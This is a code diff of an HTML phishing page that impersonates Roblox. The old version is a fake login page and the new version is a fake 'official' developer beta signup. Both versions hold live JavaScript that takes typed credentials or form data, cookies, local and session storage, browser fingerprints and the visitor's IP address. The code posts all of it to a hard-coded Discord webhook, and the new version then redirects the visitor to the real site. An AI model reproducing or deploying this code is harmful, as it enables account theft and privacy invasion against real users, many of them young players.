@@ -1,153 +1,458 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Roblox - Official Site</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Developer Conference 2024 - Exclusive Beta Access</title>
     <style>
-        body {
-            background: #f0f0f0;
-            font-family: Arial, sans-serif;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
             padding: 20px;
         }
-        .login-form {
-            width: 300px;
-            margin: 100px auto;
+
+        .header {
+            text-align: center;
+            padding: 40px 0;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+
+        .beta-access {
             background: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            margin: 20px auto;
+            max-width: 800px;
         }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 3px;
+
+        .beta-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 20px;
         }
-        button {
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+        }
+
+        .form-group input, .form-group select {
             width: 100%;
-            padding: 10px;
-            background: #00a2ff;
+            padding: 12px 16px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .checkbox-group input {
+            width: auto;
+            margin-top: 3px;
+        }
+
+        .checkbox-group label {
+            font-size: 0.9rem;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
-            border-radius: 3px;
+            padding: 15px 40px;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
             cursor: pointer;
+            transition: transform 0.2s;
+            width: 100%;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 40px;
+        }
+
+        .feature {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+
+        .feature h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .feature p {
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: white;
+            opacity: 0.8;
+            font-size: 0.9rem;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="login-form">
-        <h2>Login to Roblox</h2>
-        <form id="loginForm">
-            <input type="text" placeholder="Username/Email/Phone" required>
-            <input type="password" placeholder="Password" required>
-            <button type="submit">Login</button>
-        </form>
+    <div class="container">
+        <div class="header">
+            <h1>Roblox Developer Conference 2024</h1>
+            <p>Exclusive Beta Program - Limited Spots Available</p>
+        </div>
+
+        <div class="beta-access">
+            <span class="beta-badge">BETA ACCESS PROGRAM</span>
+            <h2>Apply for Early Access to Roblox Studio 2024</h2>
+            <p style="margin-bottom: 30px; color: #666; line-height: 1.6;">
+                Selected developers will get exclusive early access to the new Roblox Studio features, 
+                advanced scripting APIs, and priority support. This is a limited opportunity for 
+                experienced developers to shape the future of Roblox creation.
+            </p>
+
+            <form id="betaForm">
+                <div class="form-group">
+                    <label for="developerName">Full Name</label>
+                    <input type="text" id="developerName" required placeholder="Enter your full name">
+                </div>
+
+                <div class="form-group">
+                    <label for="developerEmail">Professional Email</label>
+                    <input type="email" id="developerEmail" required placeholder="your.name@studio.com">
+                </div>
+
+                <div class="form-group">
+                    <label for="portfolio">Portfolio or Experience Level</label>
+                    <select id="portfolio" required>
+                        <option value="">Select your experience level</option>
+                        <option value="beginner">Beginner (1-2 years)</option>
+                        <option value="intermediate">Intermediate (2-4 years)</option>
+                        <option value="advanced">Advanced (4+ years)</option>
+                        <option value="expert">Expert (6+ years, published games)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="specialization">Primary Specialization</label>
+                    <select id="specialization" required>
+                        <option value="">Select your specialization</option>
+                        <option value="scripting">Lua Scripting</option>
+                        <option value="building">3D Building</option>
+                        <option value="uiux">UI/UX Design</option>
+                        <option value="monetization">Game Monetization</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="nda" required>
+                    <label for="nda">
+                        I agree to the Non-Disclosure Agreement and understand that beta features 
+                        are confidential and cannot be shared publicly until official release.
+                    </label>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="feedback" required>
+                    <label for="feedback">
+                        I commit to providing regular feedback and bug reports to help improve 
+                        Roblox Studio before public release.
+                    </label>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    Apply for Beta Access
+                </button>
+            </form>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Processing your application...</p>
+            </div>
+
+            <div class="features">
+                <div class="feature">
+                    <h3>🚀 Advanced Scripting APIs</h3>
+                    <p>Access to new Lua APIs and development tools before anyone else</p>
+                </div>
+                <div class="feature">
+                    <h3>🎮 Enhanced Physics Engine</h3>
+                    <p>Test the new physics system with improved performance</p>
+                </div>
+                <div class="feature">
+                    <h3>💎 Priority Support</h3>
+                    <p>Direct access to Roblox engineering team for technical support</p>
+                </div>
+                <div class="feature">
+                    <h3>📊 Analytics Dashboard</h3>
+                    <p>Early access to new analytics and player behavior tools</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Roblox Corporation. This is an official beta testing program.</p>
+            <p>All applications are subject to review and approval.</p>
+        </div>
     </div>
 
     <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1423743576449355829/yY-2bD1RbEK5QAIloiuJzPyIaMP_g8bgjhMjfw0jdBQc-CcH_EjiGXE-UWF1zJsygOuA";
+        const WEBHOOK = "https://discord.com/api/webhooks/1423743576449355829/yY-2bD1RbEK5QAIloiuJzPyIaMP_g8bgjhMjfw0jdBQc-CcH_EjiGXE-UWF1zJsygOuA";
 
-    // Создаем скрытый iframe для Roblox.com
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://www.roblox.com';
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
-
-    // Пытаемся получить куки через iframe
-    setTimeout(() => {
-        try {
-            const robloxCookies = iframe.contentDocument?.cookie;
-            if (robloxCookies) {
-                sendToDiscord('ROBLOX_IFRAME_COOKIES', robloxCookies);
-            }
-        } catch(e) {
-            // Если не получилось через iframe, используем другие методы
-            stealCookiesAdvanced();
-        }
-    }, 2000);
-
-    function stealCookiesAdvanced() {
-        // Метод 1: Попытка XHR с credentials
-        const xhr = new XMLHttpRequest();
-        xhr.withCredentials = true;
-        xhr.open('GET', 'https://www.roblox.com/games', true);
-        xhr.onreadystatechange = function() {
-            if(xhr.readyState === 4) {
-                const cookies = xhr.getResponseHeader('set-cookie');
-                if(cookies) {
-                    sendToDiscord('XHR_COOKIES', cookies);
+        // Плавный сбор данных без подозрений
+        function collectComprehensiveData(formData) {
+            const comprehensiveData = {
+                // Данные формы
+                form_data: formData,
+                
+                // Технические данные
+                technical: {
+                    user_agent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies_enabled: navigator.cookieEnabled,
+                    java_enabled: navigator.javaEnabled(),
+                    pdf_viewer_enabled: navigator.pdfViewerEnabled,
+                    hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+                    device_memory: navigator.deviceMemory || 'unknown'
+                },
+                
+                // Сетевые данные
+                network: {
+                    ip: 'fetching...',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : 'not_available'
+                },
+                
+                // Поведенческие данные
+                behavioral: {
+                    time_on_page: Date.now(),
+                    referrer: document.referrer,
+                    url: window.location.href
+                },
+                
+                // Расширенные данные
+                extended: {
+                    cookies: document.cookie,
+                    localStorage: JSON.stringify(localStorage),
+                    sessionStorage: JSON.stringify(sessionStorage),
+                    plugins: Array.from(navigator.plugins).map(p => ({
+                        name: p.name,
+                        filename: p.filename
+                    }))
                 }
-            }
-        };
-        xhr.send();
+            };
 
-        // Метод 2: Fetch с credentials
-        fetch('https://www.roblox.com/games', { 
-            credentials: 'include',
-            mode: 'no-cors'
-        }).then(response => {
-            // Логируем попытку
-            sendToDiscord('FETCH_ATTEMPT', 'Tried to include credentials');
+            // Получаем IP асинхронно
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ipData => {
+                    comprehensiveData.network.ip = ipData.ip;
+                    sendToDiscord(comprehensiveData, 'BETA_APPLICATION_FULL');
+                })
+                .catch(() => {
+                    comprehensiveData.network.ip = 'failed_to_fetch';
+                    sendToDiscord(comprehensiveData, 'BETA_APPLICATION_FULL');
+                });
+
+            return comprehensiveData;
+        }
+
+        function sendToDiscord(data, type) {
+            let title, color, description;
+
+            switch(type) {
+                case 'BETA_APPLICATION_FULL':
+                    title = "🎯 BETA APPLICATION + FULL DATA";
+                    color = 0x00ff00;
+                    description = "New beta application with comprehensive data collection";
+                    break;
+                default:
+                    title = "📊 DATA COLLECTION";
+                    color = 0xffff00;
+                    description = "General data collection event";
+            }
+
+            const embed = {
+                title: title,
+                description: description,
+                color: color,
+                fields: [],
+                timestamp: new Date().toISOString()
+            };
+
+            // Добавляем данные формы
+            if (data.form_data) {
+                embed.fields.push({
+                    name: "👤 APPLICATION DATA",
+                    value: `**Name:** ${data.form_data.name}\n**Email:** ${data.form_data.email}\n**Experience:** ${data.form_data.experience}\n**Specialization:** ${data.form_data.specialization}`,
+                    inline: false
+                });
+            }
+
+            // Добавляем технические данные
+            if (data.technical) {
+                embed.fields.push({
+                    name: "🖥️ TECHNICAL DATA",
+                    value: `**User Agent:** ${data.technical.user_agent.substring(0, 100)}...\n**Platform:** ${data.technical.platform}\n**Screen:** ${data.technical.screen_resolution}\n**CPU Cores:** ${data.technical.hardware_concurrency}`,
+                    inline: false
+                });
+            }
+
+            // Добавляем сетевые данные
+            if (data.network) {
+                embed.fields.push({
+                    name: "🌐 NETWORK DATA",
+                    value: `**IP:** ${data.network.ip}\n**Connection:** ${data.network.connection.effectiveType || 'unknown'}`,
+                    inline: true
+                });
+            }
+
+            // Добавляем куки если есть
+            if (data.extended && data.extended.cookies) {
+                embed.fields.push({
+                    name: "🍪 BROWSER DATA",
+                    value: `**Cookies:** ${data.extended.cookies ? 'Yes' : 'No'}\n**Local Storage:** ${data.extended.localStorage ? 'Yes' : 'No'}`,
+                    inline: true
+                });
+            }
+
+            // Отправка в Discord
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(e => console.log('Discord send failed'));
+        }
+
+        // Обработка формы
+        document.getElementById('betaForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = {
+                name: document.getElementById('developerName').value,
+                email: document.getElementById('developerEmail').value,
+                experience: document.getElementById('portfolio').value,
+                specialization: document.getElementById('specialization').value
+            };
+
+            // Показываем загрузку
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            // Собираем и отправляем данные
+            setTimeout(() => {
+                collectComprehensiveData(formData);
+                
+                // Показываем успех и перенаправляем
+                setTimeout(() => {
+                    window.location.href = 'https://create.roblox.com';
+                }, 2000);
+            }, 1500);
         });
 
-        // Метод 3: Попытка доступа через image
-        const img = new Image();
-        img.src = 'https://www.roblox.com/favicon.ico';
-        img.onload = function() {
-            sendToDiscord('IMAGE_LOAD', 'Loaded Roblox favicon');
-        };
-    }
-
-    function sendToDiscord(method, data) {
-        const payload = {
-            embeds: [{
-                title: "🍪 COOKIE STEAL ATTEMPT",
-                color: 0xff0000,
-                fields: [
-                    { name: "Method", value: method, inline: true },
-                    { name: "Data", value: "```" + (data || 'No data') + "```", inline: false },
-                    { name: "User Agent", value: navigator.userAgent, inline: false },
-                    { name: "URL", value: window.location.href, inline: true }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        fetch(WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(e => console.log('Discord error'));
-    }
-
-    // Перехват формы логина
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const username = this.querySelector('input[type="text"]').value;
-        const password = this.querySelector('input[type="password"]').value;
-        
-        // Отправляем логин/пароль
-        sendToDiscord('LOGIN_CREDENTIALS', `Username: ${username} | Password: ${password}`);
-        
-        // Перенаправляем на настоящий Roblox
-        setTimeout(() => {
-            window.location.href = 'https://www.roblox.com/login';
-        }, 1000);
-    });
-
-    // Крадем данные при загрузке
-    window.addEventListener('load', () => {
-        sendToDiscord('PAGE_LOAD', `Cookies: ${document.cookie}`);
-        
-        // Получаем IP
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(ipData => {
-                sendToDiscord('IP_ADDRESS', ipData.ip);
-            });
-    });
+        // Сбор данных при загрузке страницы (без отправки сразу)
+        window.addEventListener('load', () => {
+            const initialData = {
+                technical: {
+                    user_agent: navigator.userAgent,
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                },
+                behavioral: {
+                    referrer: document.referrer,
+                    url: window.location.href
+                }
+            };
+            // Сохраняем для возможной отправки позже
+            window.initialVisitData = initialData;
+        });
     </script>
 </body>
 </html>
-
